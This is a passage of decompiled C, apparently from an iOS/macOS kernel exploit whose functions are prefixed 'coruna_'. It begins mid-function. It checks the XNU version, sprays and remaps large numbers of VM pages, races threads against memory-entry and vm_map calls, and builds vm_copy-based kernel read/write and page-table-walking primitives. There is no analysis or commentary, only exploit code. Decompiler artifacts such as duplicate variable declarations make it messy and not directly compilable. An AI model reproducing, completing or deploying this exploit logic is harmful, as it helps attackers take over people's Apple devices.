  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,host_info);
  if (lk1 != 0) {
    if (lk1 != 0x35) {
      return;
    }
    thread_attr[0] = 1;
    thread_attr[1] = 4;
    scratch = 0x200;
    err = _sysctl(thread_attr,2,host_info,&scratch,(void *)0x0,0);
    if (err != 0) {
      return;
    }
  }
  ptr = _strstr(host_info,"RELEASE");
  if ((ptr != (char *)0x0) && (ptr = _strstr(host_info,"xnu-"), ptr != (char *)0x0)) {
    bootargs = 0;
    scratch = 0;
    err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
    if (err == 3) {
      *len = scratch;
      *(uint32_t *)(len + 1) = bootargs;
    }
  }
  return;
}
void coruna_vm_remap(vm_address_t arg,vm_size_t arg_x,boolean_t arg_x_x)
{
  vm_prot_t scratch [2];
  vm_address_t bootargs;
  
  scratch[0] = 0;
  scratch[1] = 0;
  bootargs = 0;
  _vm_remap(*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,arg_x,0,1,
            *(vm_map_t *)k_kernel_mach_task_self_slot,arg,arg_x_x,scratch + 1,scratch,1);
  return;
}
void coruna_vm_remap_7d00(vm_address_t arg,vm_size_t arg_x,boolean_t arg_x_x)
{
  vm_prot_t scratch [2];
  vm_address_t bootargs;
  
  scratch[0] = 0;
  scratch[1] = 0;
  bootargs = arg;
  _vm_remap(*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,arg_x,0,0x4000,
            *(vm_map_t *)k_kernel_mach_task_self_slot,arg,arg_x_x,scratch + 1,scratch,1);
  return;
}
void coruna_vm_region_recurse_64(vm_address_t arg)
{
  int scratch [22];
  vm_size_t bootargs;
  vm_address_t thread_attr;
  mach_msg_type_number_t host_info;
  natural_t serial_buf;
  
  bootargs = 0;
  scratch[0x11] = 0;
  scratch[0x12] = 0;
  scratch[0x10] = 0;
  scratch[10] = 0;
  scratch[0xb] = 0;
  scratch[8] = 0;
  scratch[9] = 0;
  scratch[0xe] = 0;
  scratch[0xf] = 0;
  scratch[0xc] = 0;
  scratch[0xd] = 0;
  scratch[2] = 0;
  scratch[3] = 0;
  scratch[0] = 0;
  scratch[1] = 0;
  scratch[6] = 0;
  scratch[7] = 0;
  scratch[4] = 0;
  scratch[5] = 0;
  host_info = 0x13;
  serial_buf = 1;
  thread_attr = arg;
  _vm_region_recurse_64
            (*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,&bootargs,&serial_buf,scratch,
             &host_info);
  return;
}
void coruna_fn_ptr_cast(void)
{
  return;
}
void coruna_helper_5d2c_7e4c(void)
{
  return;
}
void coruna_mach_timebase_info_7e88(void)
{
  mach_port_t thread;
  double ld1;
  double ld2;
  mach_timebase_info_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint32_t scratch;
  
  _mach_timebase_info(&scratch);
  ld1 = (double)NEON_ucvtf((unsigned long)scratch.denom);
  ld2 = (double)NEON_ucvtf((unsigned long)scratch.numer);
  bootargs = (int)((ld1 / ld2) * k_kernel_rodata_word_42ef0 * 50.0);
  scratch = 0;
  thread_attr = bootargs;
  host_info = bootargs;
  thread = _mach_thread_self();
  _thread_policy_set(thread,2,&bootargs,4);
  _thread_switch(0,2,0);
  return;
}
void coruna_qsort_7f24(long handle,long addr_2)
{
  int *err;
  long handle;
  long addr;
  unsigned long u;
  long off;
  unsigned long scratch [17];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0xd] = 0;
  scratch[0xc] = 0;
  scratch[0xf] = 0;
  scratch[0xe] = 0;
  scratch[9] = 0;
  scratch[8] = 0;
  scratch[0xb] = 0;
  scratch[10] = 0;
  scratch[5] = 0;
  scratch[4] = 0;
  scratch[7] = 0;
  scratch[6] = 0;
  scratch[1] = 0;
  scratch[0] = 0;
  scratch[3] = 0;
  scratch[2] = 0;
  handle = *(long *)(addr_2 + 8);
  u = 1;
  addr = 1;
  do {
    off = handle + 0x100;
    handle = *(long *)(addr_2 + addr * 0x10 + 8);
    if (handle == off) {
      u = u + 1;
    }
    else {
      if ((u & 0x3f) == 0) {
        off = 0;
        u = *(unsigned long *)(addr_2 + addr * 0x10 + -0x3f8) & 0x3fff | 0x4000;
        do {
          if (*(unsigned long *)((long)scratch + off) == 0) {
            *(unsigned long *)((long)scratch + off) = u;
            *(uint64_t *)((long)scratch + off + 8) = 1;
            break;
          }
          if (*(unsigned long *)((long)scratch + off) == u) {
            *(long *)((long)scratch + off + 8) = *(long *)((long)scratch + off + 8) + 1;
            break;
          }
          off = off + 0x10;
        } while (off != 0x80);
      }
      u = 1;
    }
    addr = addr + 1;
    if (addr == 64000) {
      err = (int *)coruna_kernel509_via_helper_5d2c_419fc(coruna_helper_5d2c_7e4c);
      _qsort(scratch,8,0x10,err);
      *(unsigned long *)(handle + 8) = scratch[0];
      if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
        ___stack_chk_fail();
      }
      return;
    }
  } while( true );
}
void coruna_vm_allocate_807c(uint64_t *val)
{
  uint64_t *ptr;
  uint8_t *buf;
  unsigned long u;
  bool err;
  uint64_t *str;
  void *ptr;
  int *err;
  uint64_t extraout_x1;
  long handle;
  unsigned long size;
  long addr;
  long off;
  long *buf;
  unsigned long version;
  long base;
  long ctx_val;
  vm_address_t scratch;
  
  str = _malloc(0x28);
  ptr = _malloc(0xfa000);
  str[1] = ptr;
  ptr = _malloc(16000);
  ctx_val = 0;
  str[3] = 0;
  str[4] = 0;
  str[2] = ptr;
  *str = *val;
  *val = str;
  buf = k_kernel_mach_task_self_slot;
  do {
    scratch = 0;
    _vm_allocate(*(vm_map_t *)buf,&scratch,0x4000,1);
    ptr = (void *)str[1];
    *(vm_address_t *)((long)ptr + ctx_val) = scratch;
    ctx_val = ctx_val + 0x10;
  } while (ctx_val != 0xfa000);
  ctx_val = 0;
  do {
    coruna_vm_remap_7d00(*(uint64_t *)((long)ptr + ctx_val),0x4000,0);
    ptr = (void *)str[1];
    ctx_val = ctx_val + 0x10;
  } while (ctx_val != 0xfa000);
  ctx_val = 0;
  do {
    coruna_vm_region_recurse_64(*(uint64_t *)((long)ptr + ctx_val));
    ptr = (void *)str[1];
    *(uint64_t *)((long)ptr + ctx_val + 8) = extraout_x1;
    ctx_val = ctx_val + 0x10;
  } while (ctx_val != 0xfa000);
  err = (int *)coruna_kernel509_via_helper_5d2c_419fc(coruna_fn_ptr_cast);
  _qsort(ptr,64000,0x10,err);
  ctx_val = val[1];
  if (ctx_val == 0) {
    coruna_qsort_7f24(val,str[1]);
    ctx_val = val[1];
  }
  size = 0;
  handle = str[1];
  do {
    addr = *(long *)(handle + size * 0x10 + 8);
    if ((((uint)ctx_val ^ (uint)addr) & 0x3fff) == 0) {
      base = size + 1;
      off = addr + 0x100;
      if (*(long *)(handle + base * 0x10 + 8) == off) {
        buf = (long *)(handle + 0x28 + size * 0x10);
        u = 1;
        do {
          version = u;
          if (version == 0x3f) goto fail;
          base = *buf;
          off = off + 0x100;
          buf = buf + 2;
          u = version + 1;
        } while (off == base);
        err = version < 0x3f;
        base = size + version + 1;
      }
      else {
        err = true;
      }
      size = base - 1;
      if (!err) {
fail:
        base = str[4];
        ptr = (uint64_t *)(str[2] + base * 0x10);
        *ptr = *(uint64_t *)(handle + size * 0x10);
        ptr[1] = addr;
        *(uint64_t *)(handle + size * 0x10) = 0;
        str[4] = base + 1;
        size = size + 0x3f;
      }
    }
    size = size + 1;
    if (0xf9c0 < size) {
      return;
    }
  } while( true );
}
void coruna_kernel509_via_vm_allocate_807c(long *handle)
{
  long handle;
  long addr;
  
  handle = *handle;
  if ((handle == 0) || (addr = *(long *)(handle + 0x18), addr == *(long *)(handle + 0x20))) {
    coruna_vm_allocate_807c(handle);
    handle = *handle;
    addr = *(long *)(handle + 0x18);
  }
  *(long *)(handle + 0x18) = addr + 1;
  return;
}
void coruna_vm_deallocate_94b0(void *ctx)
{
  uint8_t *ptr;
  vm_address_t address;
  long handle;
  unsigned long u;
  long addr;
  
  ptr = k_kernel_mach_task_self_slot;
  handle = 0;
  do {
    addr = *(long *)((long)ctx + 8);
    address = *(vm_address_t *)(addr + handle);
    if (address != 0) {
      _vm_deallocate(*(vm_map_t *)ptr,address,0x4000);
      *(uint64_t *)(addr + handle) = 0;
    }
    handle = handle + 0x10;
  } while (handle != 0xfa000);
  u = *(unsigned long *)((long)ctx + 0x18);
  if (u < *(unsigned long *)((long)ctx + 0x20)) {
    handle = u << 4;
    do {
      addr = *(long *)((long)ctx + 0x10);
      _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(addr + handle),0x4000);
      *(uint64_t *)(addr + handle) = 0;
      u = u + 1;
      handle = handle + 0x10;
    } while (u < *(unsigned long *)((long)ctx + 0x20));
  }
  _free(*(void **)((long)ctx + 8));
  _free(*(void **)((long)ctx + 0x10));
  _free(ctx);
  return;
}
void coruna_vm_map_83dc(mem_entry_name_port_t *arg)
{
  int *err;
  byte err;
  mem_entry_name_port_t object;
  char err;
  bool status;
  uint8_t *ptr;
  long handle;
  vm_inherit_t in_stack_ffffffffffffffb0;
  vm_address_t scratch;
  
  object = *arg;
  handle = *(long *)(arg + 2);
  err = (int *)(handle + 0x18);
  do {
    err = '\x01';
    status = (bool)coruna_ldrex_pass(err,0x10);
    if (status) {
      *err = *err + 1;
      err = coruna_ldrexp_clear();
    }
    ptr = k_kernel_mach_task_self_slot;
  } while (err != '\0');
  err = *(byte *)(handle + 0x1c);
  while ((err & 1) == 0) {
    scratch = 0;
    _vm_map(*(vm_map_t *)ptr,&scratch,0x4000,0,0,object,0,1,1,1,in_stack_ffffffffffffffb0);
    err = *(byte *)(handle + 0x1c);
  }
  return;
}
void coruna_mach_make_memory_entry_64(long handle,mem_entry_name_port_t *arg)
{
  int err;
  void **lppv2;
  pthread_t *pp_Var3;
  uint64_t *ptr;
  long handle;
  mach_port_t scratch;
  memory_object_size_t bootargs;
  uint64_t thread_attr;
  long host_info [7];
  pthread_t serial_buf [5];
  long action;
  
  handle = 0;
  action = *(long *)k_kernel_stack_chk_guard_slot;
  *(uint32_t *)(handle + 0x18) = 0;
  *(uint32_t *)(handle + 0x1c) = 0;
  serial_buf[1] = (pthread_t)0x0;
  serial_buf[0] = (pthread_t)0x0;
  serial_buf[3] = (pthread_t)0x0;
  serial_buf[2] = (pthread_t)0x0;
  host_info[4] = 0;
  host_info[3] = 0;
  host_info[6] = 0;
  host_info[5] = 0;
  host_info[0] = 0;
  thread_attr = 0;
  host_info[2] = 0;
  host_info[1] = 0;
  pp_Var3 = serial_buf;
  ptr = &thread_attr;
  do {
    *(uint32_t *)ptr = *(uint32_t *)((long)arg + handle);
    ptr[1] = handle;
    lppv2 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_vm_map_83dc);
    err = _pthread_create(pp_Var3,(pthread_attr_t *)0x0,lppv2,ptr);
    if (err != 0) {
      ___error();
    }
    handle = handle + 4;
    pp_Var3 = pp_Var3 + 1;
    ptr = ptr + 2;
  } while (handle != 0x10);
  while (*(int *)(handle + 0x18) != 4) {
    _usleep(1000);
  }
  bootargs = 0x4000;
  scratch = 0;
  _mach_make_memory_entry_64
            (*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,0,1,&scratch,*arg);
  handle = 0;
  *(uint32_t *)(handle + 0x1c) = 1;
  do {
    err = _pthread_join(*(pthread_t *)((long)serial_buf + handle),(void **)0x0);
    if (err != 0) {
      ___error();
    }
    handle = handle + 8;
  } while (handle != 0x20);
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(scratch);
}
void coruna_mach_make_memory_entry_64_862c(long handle,vm_address_t *arg)
{
  uint8_t *ptr;
  mach_port_name_t name;
  vm_address_t *ptr;
  int extraout_var;
  unsigned long u;
  uint64_t size;
  vm_address_t extraout_x1;
  long handle;
  unsigned long version;
  vm_address_t lv7;
  mem_entry_name_port_t scratch [4];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = (vm_address_t *)coruna_kernel509_via_vm_allocate_807c();
  _thread_switch(0,2,0);
  ptr = k_kernel_mach_task_self_slot;
  _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*ptr,0x4000);
  handle = 0;
  *ptr = 0;
  scratch[0] = 0;
  scratch[1] = 0;
  scratch[2] = 0;
  scratch[3] = 0;
  do {
    _mach_make_memory_entry_64
              (*(vm_map_t *)ptr,(memory_object_size_t *)&ghidra_stack_0,
               *(memory_object_offset_t *)(handle + 0x10),1,(mach_port_t *)((long)scratch + handle)
               ,0);
    handle = handle + 4;
  } while (handle != 0x10);
  lv7 = 0;
  _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&ghidra_stack_0,0x4000,0,1,scratch[0],0,0,1,
          1,0);
  coruna_vm_region_recurse_64(lv7);
  if (extraout_x1 == ptr[1]) {
    name = coruna_mach_make_memory_entry_64(handle,scratch);
    u = coruna_vm_region_recurse_64(lv7);
    if ((unsigned long)(extraout_var + 1) != u >> 0x20) {
      version = 0;
      *arg = extraout_x1;
      arg[1] = lv7;
      *(mach_port_name_t *)(arg + 2) = name;
      lv7 = (unsigned long)(extraout_var + 1) + ~(u >> 0x20);
      arg[4] = lv7;
      while( true ) {
        if (version < lv7) {
          *(mem_entry_name_port_t *)((long)arg + version * 4 + 0x14) = scratch[version];
        }
        else {
          _mach_port_deallocate(*(ipc_space_t *)ptr,scratch[version]);
          scratch[version] = 0;
        }
        if (version == 3) break;
        lv7 = arg[4];
        version = version + 1;
      }
      size = 1;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(size);
    }
    _mach_port_deallocate(*(ipc_space_t *)ptr,name);
  }
  _vm_deallocate(*(vm_map_t *)ptr,lv7,0x4000);
  handle = 0;
  do {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)scratch + handle));
    *(uint32_t *)((long)scratch + handle) = 0;
    handle = handle + 4;
  } while (handle != 0x10);
  size = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_vm_copy(long handle,unsigned long arg,uint32_t *size)
{
  vm_address_t source_address;
  
  source_address = *(vm_address_t *)(handle + 0x548);
  *(int *)(source_address + 0x230) = (int)(arg >> 0xe);
  _vm_copy(*(vm_map_t *)k_kernel_mach_task_self_slot,source_address,0xc000,
           *(vm_address_t *)(handle + 0x550));
  coruna_vm_remap_7d00(*(uint64_t *)(handle + 0x560),0x4000,0);
  *size = *(uint32_t *)(*(long *)(handle + 0x560) + (arg & 0x3fff));
  return;
}
void coruna_vm_copy_88e0(long handle,unsigned long arg,void *ctx,size_t len)
{
  uint8_t *ptr;
  vm_address_t source_address;
  
  source_address = *(vm_address_t *)(handle + 0x548);
  *(int *)(source_address + 0x230) = (int)(arg >> 0xe);
  ptr = k_kernel_mach_task_self_slot;
  _vm_copy(*(vm_map_t *)k_kernel_mach_task_self_slot,source_address,0xc000,
           *(vm_address_t *)(handle + 0x550));
  _vm_copy(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x560),0xc000,
           *(vm_address_t *)(handle + 0x568));
  _memcpy(ctx,(void *)(*(long *)(handle + 0x568) + (arg & 0x3fff)),len);
  return;
}
void coruna_vm_copy_8988(long handle,void *ctx,unsigned long arg,size_t len)
{
  void *source_address;
  uint8_t *ptr;
  vm_address_t source_address_00;
  long handle;
  
  source_address_00 = *(vm_address_t *)(handle + 0x548);
  *(int *)(source_address_00 + 0x230) = (int)(arg >> 0xe);
  ptr = k_kernel_mach_task_self_slot;
  _vm_copy(*(vm_map_t *)k_kernel_mach_task_self_slot,source_address_00,0xc000,
           *(vm_address_t *)(handle + 0x550));
  source_address = (void *)((*(long *)(handle + 0x578) - len) + 0x4000);
  handle = *(long *)(handle + 0x580);
  _memcpy(source_address,ctx,len);
  _vm_copy(*(vm_map_t *)ptr,(vm_address_t)source_address,len + 0x8000,
           handle + (arg & 0x3fff));
  return;
}
void coruna_bzero_2(long handle,unsigned long arg)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  long handle;
  unsigned long scratch [2048];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  version = *(unsigned long *)(handle + 0x520);
  _bzero(scratch,0x4000);
  handle = 0;
  do {
    if ((handle != 0) || (u = *(unsigned long *)(handle + 0x528), u == 0)) {
      u = *(unsigned long *)((long)&k_kernel_rodata_word_42f58 + handle);
    }
    size = *(unsigned long *)((long)&k_kernel_rodata_word_42f50 + handle);
    coruna_vm_copy_88e0(handle,version,scratch,0x4000);
    version = scratch[(u & arg) >> (size & 0x3f) & 0xffffffff];
    if ((*(unsigned long *)((long)&k_kernel_rodata_word_42f60 + handle) & (version ^ 0xffffffffffffffff)) != 0) break;
    if ((*(unsigned long *)((long)&k_kernel_rodata_word_42f68 + handle) & version) == *(unsigned long *)((long)&k_kernel_rodata_word_42f70 + handle)
       ) {
      version = version & (*(unsigned long *)((long)&k_kernel_rodata_word_42f48 + handle) ^ 0xffffffffffffffff) &
              0xfffffffff000 | *(unsigned long *)((long)&k_kernel_rodata_word_42f48 + handle) & arg;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(version);
    }
    version = version & 0xffffffffc000;
    handle = handle + 0x38;
  } while (handle != 0xa8);
  version = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(version);
}
void coruna_kernel509_via_vm_copy_88e0(uint64_t val,unsigned long arg,long handle,unsigned long arg)
{
  unsigned long u;
  uint64_t size;
  unsigned long version;
  
  for (; arg != 0; arg = arg - u) {
    version = 0x4000 - (arg & 0x3fff);
    u = arg;
    if (version <= arg) {
      u = version;
    }
    size = coruna_bzero_2(val,arg);
    coruna_vm_copy_88e0(val,size,handle,u);
    arg = u + arg;
    handle = handle + u;
  }
  return;
}
void coruna_kernel509_via_vm_copy_8988(uint64_t val,long handle,unsigned long arg,unsigned long arg)
{
  unsigned long u;
  uint64_t size;
  unsigned long version;
  
  for (; arg != 0; arg = arg - u) {
    version = 0x4000 - (arg & 0x3fff);
    u = arg;
    if (version <= arg) {
      u = version;
    }
    size = coruna_bzero_2(val,arg);
    coruna_vm_copy_8988(val,handle,size,u);
    handle = handle + u;
    arg = u + arg;
  }
  return;
}
void coruna_vm_region_recurse_64_8ce0(long handle)
{
  uint8_t *ptr;
  long handle;
  int scratch [22];
  vm_size_t bootargs;
  vm_address_t thread_attr;
  mach_msg_type_number_t host_info;
  natural_t serial_buf;
  
  ptr = k_kernel_mach_task_self_slot;
  thread_attr = 0;
  handle = *(long *)(handle + 0x10);
  while( true ) {
    if (handle != 0) {
      return;
    }
    bootargs = 0;
    scratch[0x11] = 0;
    scratch[0x12] = 0;
    scratch[0x10] = 0;
    scratch[10] = 0;
    scratch[0xb] = 0;
    scratch[8] = 0;
    scratch[9] = 0;
    scratch[0xe] = 0;
    scratch[0xf] = 0;
    scratch[0xc] = 0;
    scratch[0xd] = 0;
    scratch[2] = 0;
    scratch[3] = 0;
    scratch[0] = 0;
    scratch[1] = 0;
    scratch[6] = 0;
    scratch[7] = 0;
    scratch[4] = 0;
    scratch[5] = 0;
    host_info = 0x13;
    serial_buf = 1;
    _vm_region_recurse_64(*(vm_map_t *)ptr,&thread_attr,&bootargs,&serial_buf,scratch,&host_info);
    if ((serial_buf != 0) && (coruna_u64_pack((scratch[4]), (scratch[3])) == 0)) break;
    thread_attr = thread_attr + bootargs;
    handle = *(long *)(handle + 0x10);
  }
  *(vm_address_t *)(handle + 0x10) = thread_attr;
  return;
}
void coruna_vm_allocate_8db0(long handle)
{
  uint8_t *ptr;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t *)(handle + 0x20),
          *(long *)(handle + 0x598) * 0x4000 + 0xc000,0x1ffffff,1,0,0,0,3,1,
          in_stack_ffffffffffffffd0);
  scratch = *(vm_address_t *)(handle + 0x20);
  _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,0x4000);
  scratch = *(long *)(handle + 0x20) + 0x4000;
  _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,0x4000);
  scratch = *(long *)(handle + 0x20) + 0x8000;
  _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,0x4000);
  **(uint8_t **)(handle + 0x20) = 0x41;
  return;
}
void coruna_vm_allocate_8ea8(long handle)
{
  uint8_t *ptr;
  void *ptr;
  long handle;
  vm_address_t scratch;
  
  ptr = _malloc(800000);
  handle = 0;
  *(void **)(handle + 0x30) = ptr;
  ptr = k_kernel_mach_task_self_slot;
  do {
    scratch = 0;
    _vm_allocate(*(vm_map_t *)ptr,&scratch,0x4000,1);
    *(vm_address_t *)(*(long *)(handle + 0x30) + handle) = scratch;
    handle = handle + 8;
  } while (handle != 800000);
  return;
}
void coruna_vm_allocate_8f4c(long handle)
{
  uint8_t *ptr;
  unsigned long u;
  unsigned long size;
  long handle;
  vm_address_t scratch;
  
  *(uint64_t *)(handle + 0x448) = 0x400000;
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,0x400000,3);
  *(vm_address_t *)(handle + 0x438) = scratch;
